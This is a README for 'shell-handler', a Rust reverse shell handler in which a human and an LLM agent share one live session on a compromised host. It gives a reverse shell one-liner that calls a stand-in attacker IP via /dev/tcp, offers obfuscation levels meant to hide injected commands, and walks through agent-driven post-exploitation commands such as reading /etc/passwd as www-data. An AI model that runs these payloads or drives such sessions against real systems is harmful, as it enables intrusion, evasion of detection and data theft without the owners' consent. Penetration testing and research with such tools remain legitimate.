# shell-handler

A reverse shell handler written in Rust. Designed for ergonomic human use and LLM/agent automation simultaneously — both share the same live shell session without conflict.

---

## Quick start

```bash
# Terminal 1: wait for an incoming reverse shell on port 4444
shell-handler listen 4444

# On the target — any common payload:
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Terminal 2 (or LLM): inject commands into the live session
shell-handler exec <session-id> whoami
```

---

## Subcommands

### `listen`

Start a TCP listener and drop into an interactive shell session when a reverse connection arrives.

```
shell-handler listen <PORT> [OPTIONS]
```

| Argument / Flag | Default | Description |
|---|---|---|
| `PORT` | *(required)* | TCP port to bind |
| `-l, --listen <ADDR>` | `0.0.0.0` | Bind address |
| `-o, --obfuscation <LEVEL>` | `none` | Obfuscation level: `none` \| `light` \| `medium` \| `heavy` |
| `-s, --shell <TYPE>` | `auto` | Shell type: `auto` \| `linux` \| `windows` |
| `--session <ID>` | *(random 8-char)* | Pin a custom session ID instead of generating one |

Examples:
```bash
shell-handler listen 4444
shell-handler listen 4444 -o light -s linux
shell-handler listen 443 -l 10.0.0.5 --session mysession
```

The session ID is printed in the startup banner and used by all other subcommands.

---

### `ps`

List all active shell sessions on this host.

```
shell-handler ps [OPTIONS]
```

| Flag | Description |
|---|---|
| `-q, --quiet` | Print only session IDs, one per line — machine-readable |
| `--json` | Output a JSON array with full session metadata |

Examples:
```bash
shell-handler ps
# SESSION     PEER                    IDENTITY              OBFUSCATION  SHELL
# a1b2c3d4    192.168.1.100:55705     www-data@targetbox    heavy        linux

shell-handler ps -q
# a1b2c3d4

shell-handler ps --json
# [{"id":"a1b2c3d4","peer":"192.168.1.100:55705","user":"www-data","host":"targetbox","obfuscation":"heavy","shell":"linux"}]
```

Session detection works by scanning `/tmp/.shh-*.sock`. No daemon is needed.

---

### `exec`

Inject a command into a running session and return its output. This is the primary interface for LLM/agent automation.

```
shell-handler exec [OPTIONS] <SESSION-ID> [--cmd <CMD> | <COMMAND...>]
```

| Argument / Flag | Default | Description |
|---|---|---|
| `SESSION-ID` | *(required)* | Target session ID |
| `-c, --cmd <CMD>` | — | **Exact command string** sent to the remote shell — no token splitting. Use for any command with quotes, pipes, or shell syntax. Takes priority over trailing tokens. |
| `COMMAND...` | — | Simple command as space-separated tokens (joined with spaces). Sufficient for commands that contain no shell metacharacters. |
| `--format <FORMAT>` | `text` | Output format: `text` \| `json` |

#### Which form to use

**Use `--cmd` whenever the command contains quotes, semicolons, pipes, or other shell metacharacters.** Trailing tokens are convenient for simple commands but cannot preserve quoting context.

```bash
# Simple commands — trailing tokens are fine
shell-handler exec a1b2c3d4 whoami
shell-handler exec a1b2c3d4 ls -la /etc

# Complex commands — always use --cmd
shell-handler exec a1b2c3d4 --cmd "python3 -c \"print('hello')\""
shell-handler exec a1b2c3d4 --cmd "cat /etc/passwd | grep root"
shell-handler exec a1b2c3d4 --cmd "for f in /tmp/*.txt; do echo \$f; done"

# JSON output — designed for LLM consumption
shell-handler exec --format json a1b2c3d4 --cmd "id"
# {"output":"uid=33(www-data) gid=33(www-data)...\n","exit_code":0}

shell-handler exec --format json a1b2c3d4 cat /etc/passwd
# {"output":"root:x:0:0:root:/root:/bin/bash\n...","exit_code":0}
```

#### Why `--cmd` exists: the two-shell quoting problem

Every command passes through **two** shells: the LLM's shell (which processes the arguments to `shell-handler`) and the **remote target shell** (which executes the decoded, deobfuscated command). Single quotes in particular are fragile:

```
shell-handler exec abc "python3 -c print('test')"
                           ↓
  Your shell strips outer "…" — ok, one argument
                           ↓
  shell-handler joins tokens → python3 -c print('test')
                           ↓
  Obfuscation encodes it → eval "$(echo '...' | base64 -d)"
                           ↓
  Remote bash decodes → python3 -c print('test')
  Remote bash consumes single quotes → Python gets print(test) → NameError ✗
```

With `--cmd` and correct quoting for the **remote shell**:

```
shell-handler exec abc --cmd "python3 -c \"print('hello')\""
                           ↓
  Your shell strips outer "…", keeps \" as " → python3 -c "print('hello')"
                           ↓
  shell-handler passes this string to obfuscation unchanged
                           ↓
  Remote bash decodes → python3 -c "print('hello')"
  Remote bash processes inner "…" → Python gets print('hello') → ok ✓
```

#### LLM subprocess pattern (recommended)

When an LLM calls shell-handler as a subprocess (no intermediate shell), pass the command as a single `--cmd` argument. The string is taken verbatim — no escaping needed beyond what the remote shell requires:

```python
subprocess.run([
    "shell-handler", "exec", session_id,
    "--cmd", "python3 -c \"print('hello')\"",
    "--format", "json",
])
```

Behaviour:
- The command is obfuscated at the same level configured when `listen` was started.
- Output is collected until a nonce-based sentinel (`SH_CMD_DONE_<nonce>:$?`) appears in the remote output, then returned.
- If the session is busy with another `exec`, this call returns immediately with exit code `1` and an error message in `output`.
- The interactive TUI shows `[>] agent: <cmd>` when a command is injected, and `[agent running...]` while waiting.
- The human operator can press **CTRL+C** to cancel a running `exec` (exit code `130`).

---

### `inspect`

Show detailed metadata for a single session, including timing and command history.

```
shell-handler inspect <SESSION-ID>
```

Example output:
```
  Session       a1b2c3d4
  Peer          192.168.1.100:55705
  Identity      www-data@targetbox
  Obfuscation   heavy
  Shell         linux

  Started       2026-07-01 14:30:22 UTC  (42m ago)
  Commands      17
  Last cmd      cat /etc/passwd  (8m ago)
```

Fields shown only in `inspect` (not in `ps`):

| Field | Description |
|---|---|
| `Started` | UTC timestamp when the session was established, plus relative elapsed time |
| `Commands` | Total number of commands run (both interactive and via `exec`) |
| `Last cmd` | The most recent command text and how long ago it was run |

---

### `kill`

Terminate a running session gracefully.

```
shell-handler kill <SESSION-ID>
```

Sends a kill signal over the IPC socket. The interactive session prints a notice and exits cleanly. Socket and metadata files are removed automatically.

---

## Interactive shell

When a reverse connection arrives, the handler automatically upgrades the remote to a PTY (via `python3 pty.spawn`, `python pty.spawn`, or `script`) and enters **raw PTY passthrough** mode. Every keystroke is forwarded byte-for-byte; all ANSI sequences, cursor movement, tab-completion, vim, htop, python3 REPL, and SSH all work out of the box.

Press **CTRL+Q** at any time to drop to **handler mode** (a line-editor with history, meta-commands, and the LLM exec interface). Type `pty` or `upgrade` to return to raw PTY mode.

### Identity probe

On connect, the handler sends:
```bash
printf 'SHIDENTITY:%s:%s\n' "$(whoami)" "$(hostname -s)"
```
and waits up to 2 seconds for the response. The resolved `user` and `host` are stored in the session metadata.

### Handler mode (meta-commands)

Press **CTRL+Q** from raw PTY mode to enter handler mode. The following commands are interpreted locally — not sent to the remote.

| Command | Description |
|---|---|
| `help` | Show help |
| `clear` | Clear the screen |
| `download <remote> [local]` | Fetch a file from the target |
| `upload <local> <remote>` | Push a file to the target |
| `pty` | Return to raw PTY passthrough (no re-upgrade) |
| `upgrade` | Re-send PTY upgrade payload, then return to raw PTY mode |

### Auto-upgrade on connect

For Linux/Auto shell types, the handler automatically runs:
```bash
stty cols W rows H; python3 -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null || \
  python -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null || \
  script -qc /bin/bash /dev/null 2>/dev/null
```
immediately after the identity probe. If all fallbacks fail (minimal container, no python3, no script), you get raw passthrough on the dumb pipe — interactive programs won't have full PTY semantics, but basic commands work. Run `upgrade` manually to retry.

Windows targets (`-s windows`) skip the auto-upgrade and use line-editor mode.

### Multiline commands

Press **Alt+Enter** to insert a literal newline in the line editor. The display wraps correctly across terminal columns; pressing **Enter** submits the entire buffer as one command. Useful for one-liner Python scripts:

```
python3 -c "
import os, socket
print(os.getuid())
"
```

### Keyboard shortcuts

#### Raw PTY mode (default)

All keystrokes are forwarded byte-for-byte to the remote. The only locally-handled keys are:

| Key | Action |
|---|---|
| **CTRL+Q** | Switch to handler (line-editor) mode |
| **CTRL+]** | Switch to handler mode (US keyboard variant) |
| **CTRL+L** | Clear screen locally + send `\x0c` to remote |

#### Handler (line-editor) mode

| Key | Action |
|---|---|
| **CTRL+C** | Send interrupt (`\x03`) to the remote process. Press **twice** to disconnect the session. |
| **CTRL+Z** | Send suspend (`\x1a`) to the remote process |
| **CTRL+L** | Clear screen |
| **CTRL+D** | Send EOF (`\x04`) to the remote — exits python3 REPL, exits bash gracefully |
| **CTRL+A** / **Home** | Jump to start of line |
| **CTRL+E** / **End** | Jump to end of line |
| **CTRL+U** | Kill to start of line |
| **CTRL+K** | Kill to end of line |
| **CTRL+W** | Kill word backward |
| **↑ / ↓** | History navigation (up to 1000 entries, no consecutive duplicates) |
| **Alt+Enter** | Insert newline (multiline input) |

---

## Obfuscation levels

| Level | Technique |
|---|---|
| `none` | Commands sent verbatim — no encoding. **Default.** Multiline commands and complex python one-liners work correctly. |
| `light` | `""` injection between characters, optional trailing junk comment |
| `medium` | Random variant: temp-file eval, base64 decode, printf hex, rev-reverse, `$0 -c` |
| `heavy` | Random variant: double/triple base64, `/dev/shm` staging, printf octal, `$0` here-string |

Windows targets use pass-through regardless of level. Enable obfuscation only when needed — `light`/`medium`/`heavy` break multiline commands, and `heavy` can fail with commands that contain single quotes.

---

## Human + LLM concurrent use

A human and an LLM can operate the same live shell at the same time.

**How concurrency is managed:**

1. The interactive session owns the TCP connection.
2. LLM commands arrive via a Unix socket (`/tmp/.shh-<id>.sock`) and are serialised through an internal channel — only one can run at a time.
3. While an LLM command runs, the human sees `[agent running...]` and pressing **Enter** shows a "busy" hint instead of sending.
4. **CTRL+C** in the interactive terminal cancels the running LLM command with exit code `130`.

**Typical LLM workflow:**

```bash
# 1. Find available sessions
SESSION=$(shell-handler ps -q | head -1)

# 2. Run a command and capture structured output
RESULT=$(shell-handler exec --format json "$SESSION" --cmd "id")
# {"output":"uid=33(www-data) gid=33(www-data)...\n","exit_code":0}

# 3. Check success by exit code
shell-handler exec "$SESSION" --cmd "test -w /etc" && echo "writable"

# 4. Chain commands — use --cmd for anything with special chars
shell-handler exec "$SESSION" --cmd "cat /etc/passwd | grep -v nologin"
shell-handler exec "$SESSION" --cmd "find /var/www -name '*.php' -mtime -1"

# 5. Python one-liner (inner quotes use the remote shell's quoting rules)
shell-handler exec "$SESSION" --cmd "python3 -c \"import os; print(os.getuid())\""
```

---

## Session files

Each active session owns two files in `/tmp`:

| File | Content |
|---|---|
| `/tmp/.shh-<id>.sock` | Unix domain socket for IPC |
| `/tmp/.shh-<id>.info` | `KEY=VALUE` metadata: `peer`, `user`, `host`, `obfuscation`, `shell`, `started`, `last_cmd`, `last_cmd_at`, `cmd_count` |

Both are deleted when the session exits via a RAII cleanup guard. If the process crashes, stale files can be removed manually; the next `listen --session <id>` will overwrite them.

---

## IPC protocol

One command per Unix socket connection:

```
client → server:   <command text>\n
server → client:   <output bytes>
                   \x00SHEX:<exit_code>\n    ← trailer (NUL byte prefix, never in real output)
```

Special command: `__SHHANDLER_KILL__` causes the session to exit cleanly without running anything on the remote shell.

---

## Build

Requires Rust 1.85+ (edition 2024).

```bash
cargo build --release
# binary: target/release/shell-handler
```
